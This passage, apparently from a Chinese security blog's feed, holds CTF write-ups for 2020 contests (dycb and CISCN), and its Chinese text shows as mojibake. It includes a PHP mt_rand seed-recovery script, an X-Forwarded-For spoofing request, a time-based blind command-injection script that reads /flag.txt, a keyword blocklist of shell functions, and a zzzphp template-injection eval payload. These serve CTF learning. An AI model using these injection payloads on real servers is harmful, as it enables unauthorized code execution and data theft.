class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">51</span> <span class="number">46</span> <span class="number">46</span> <span class="number">0</span> <span class="number">51</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">51</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">51</span> <span class="number">50</span> <span class="number">50</span> <span class="number">0</span> <span class="number">51</span></span><br></pre></td></tr></table></figure><p>å†ç”¨<code>php_mt_seed</code>è§£ä¸€ä¸‹å¾—åˆ°ç§å­</p><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">718225</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $lock;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</span><br><span class="line">$hash = <span class="string">''</span>;</span><br><span class="line">$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆkeyå€¼ï¼Œå†å»æ›¿æ¢ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰ç”¨ï¼ŒåŸå› å°±åœ¨å¼€å§‹çš„æç¤ºï¼Œè¦ç”¨xff</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://122.112.252.28:20001/'</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'key'</span>:<span class="string">'nRtqGR8mtd9ZOPyI'</span>,</span><br><span class="line">    <span class="string">'lock'</span>:<span class="string">'vEUHaY'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(url=url,headers=headers,cookies=cookies)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/2.png" class=""><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a><strong>easyweb</strong></h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>æ— å›æ˜¾å‘½ä»¤æ³¨å…¥</li><li>ç›²æ³¨</li><li>linuxå¸¸ç”¨å‘½ä»¤â€”â€”cut</li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ä»€ä¹ˆéƒ½æ²¡æœ‰å°±ä¸€å¥è¯ï¼Œè€å¥—è·¯äº†ï¼ŒæŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹</p><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/3.png" class=""><p>ç»è¿‡æµ‹è¯•å‘½ä»¤æ³¨å…¥æ— å›æ˜¾ï¼Œä¸çŸ¥é“åå¼¹shellè¡Œä¸è¡Œï¼Œæ²¡æœ‰è¯•ï¼Œé˜Ÿé‡Œå¸ˆå‚…ç”¨çš„ç›²æ³¨ï¼Œå°±ç”¨ç›²æ³¨å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># url = 'http://122.112.252.28:20001/'</span></span><br><span class="line"><span class="comment"># cookies = &#123;</span></span><br><span class="line"><span class="comment">#     'key':'nRtqGR8mtd9ZOPyI',</span></span><br><span class="line"><span class="comment">#     'lock':'vEUHaY'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># headers = &#123;</span></span><br><span class="line"><span class="comment">#     'X-Forwarded-For':'127.0.0.1'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># req = requests.post(url=url,headers=headers,cookies=cookies)</span></span><br><span class="line"><span class="comment"># print(req.text)</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://119.3.37.185/'</span></span><br><span class="line">payload = <span class="string">'if [ `cut -c  &#123;num1&#125; /flag.txt` = "&#123;num2&#125;" ];then sleep 2;fi'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cmd'</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">'&#125;'</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/4.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€
    
    </summary>
    
    
    
      <category term="dycb" scheme="http://yoursite.com/tags/dycb/"/>
    
  </entry>
  
  <entry>
    <title>CISCNå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›</title>
    <link href="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
    <id>http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/</id>
    <published>2020-08-21T15:09:56.000Z</published>
    <updated>2020-08-27T14:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€<a id="more"></a></h2><p>è¿™æ¬¡æ¯”èµ›èµ›åæ„Ÿæ…¨é¢‡å¤šï¼Œçªç„¶å‘ç°ä¹Ÿæœ‰æˆé•¿ï¼Œä¸åƒä¹‹å‰ä¸€æ ·æ²¡è¾“å‡ºäº†ï¼Œå½“æ—¶æ²¡åšå‡ºçš„ä¸€é“WEBå¤ç°å‘ç°çœŸçš„å¾ˆç®€å•ï¼Œè¿˜æ˜¯å¹³æ—¶ä¸€äº›ç®€å•çš„ç‚¹æ²¡æœ‰å¤ªè¿‡é‡è§†ï¼Œä¹Ÿæ˜¯ä¸€æ¬¡è­¦é†’ï¼Œä¸‹é¢æ¥çœ‹çœ‹é¢˜</p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>call_user_func_arrayå‡½æ•°</li><li>phpå¼‚å¸¸é€€å‡º</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€å®¹å™¨ï¼Œç›´æ¥ç»™æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼Œä¼šå‘ç°èƒ½åˆ©ç”¨çš„ç‚¹å°±æ˜¯<code>call_user_func_array</code>å‡½æ•°ï¼Œä¼šå‘ç°è¿™é‡Œæœ‰å››ä¸ªä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œgoogleä¸€ä¸‹å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ•´ç†äº†phpçš„bugçš„ç½‘ç«™ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« <a href="https://bugs.php.net/bug.php?id=79982ï¼Œæ–‡ç« é‡Œæåˆ°äº†ä¸€ç§å¼‚å¸¸é€€å‡ºçš„æ–¹æ³•" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79982ï¼Œæ–‡ç« é‡Œæåˆ°äº†ä¸€ç§å¼‚å¸¸é€€å‡ºçš„æ–¹æ³•</a></p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png" class=""><p>åˆšå¥½è¿™é“é¢˜è¦è®©ç¨‹åºå¼‚å¸¸é€€å‡ºï¼Œå°±ä¼šè¿›å…¥åˆ°phpinfo()</p><p>æ ¹æ®æ–‡ç« é‡Œçš„pocï¼Œæˆ‘ä»¬åˆ©ç”¨<code>stream_socket_client</code>å‡½æ•°æ¥è§¦å‘æŠ¥é”™ï¼Œå¾—åˆ°<code>phpinfo()</code></p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/2.png" class=""><p>å¼€å§‹æ‹¿åˆ°è¿™ä¸ªé¡µé¢ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹æ¥ä¸€ä¸‹<code>disable_function</code>,éƒ½å¯ä»¥ç”¨ï¼ŒåŠ ä¸Šè¿™é¢˜å¾ˆå¿«è¢«æ‰“ç©¿ï¼Œåº”è¯¥æ²¡é‚£ä¹ˆéš¾ï¼Œæœç´¢ä¸€ä¸‹<code>flag{</code>,ç›´æ¥æ‰¾åˆ°äº†</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/3.png" class=""><h2 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>å‘½ä»¤æ‰§è¡Œ</li><li>åå¼•å·</li><li>phpè¾“å‡ºæ–¹æ³•</li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€'</span>.$val.<span class="string">'ã€‘'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€'</span>.$ifstr.<span class="string">'ã€‘'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°</p><p>ç”±äºä¸äº†è§£parserIfLabelçš„ç”¨æ³•ï¼Œåœ¨googleçš„æ—¶å€™æ‰¾åˆ°äº†ä¸€æ ·çš„æºç å’Œpocï¼Œæ˜¯ä¸€ä¸ªcveçš„éƒ¨åˆ†å†…å®¹</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/4.png" class=""><p>è¿™ä¸ªGitHubåœ°å€ç»™äº†pocä½†æ˜¯æ‰“ä¸é€šï¼Œç¨å¾®å’ŒåŸé¢˜æœ‰åŒºåˆ«<a href="https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md" target="_blank" rel="noopener">https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md</a></p><p>åæ¥åˆæ‰¾åˆ°äº†å¦ä¸€ç¯‡blogï¼Œæœ¬è´¨æ— åŒºåˆ«<a href="https://blog.csdn.net/CSDNPM250/article/details/104211233" target="_blank" rel="noopener">https://blog.csdn.net/CSDNPM250/article/details/104211233</a></p><p>æ€»çš„æ¥è¯´æ‹¿åˆ°æ‰‹çš„pocå½¢å¼å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(phpinfo());&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨æœ¬æ¬¡æµ‹è¯•å¯ä»¥å‘ç°phpæ˜¯è¢«è¿‡æ»¤äº†çš„ï¼Œå¤§å°å†™åŒå†™éƒ½æ˜¯æ— æ³•ç»•è¿‡çš„</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/5.png" class=""><p>è¿™é‡Œå°±è¦æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½å¤Ÿæ‹¿åˆ°å›æ˜¾ï¼Œçªç„¶æƒ³åˆ°æˆ‘å¯ä»¥é¿å¼€phpinfoæ‹¿å›æ˜¾å•Šï¼Œè¿™å‡ 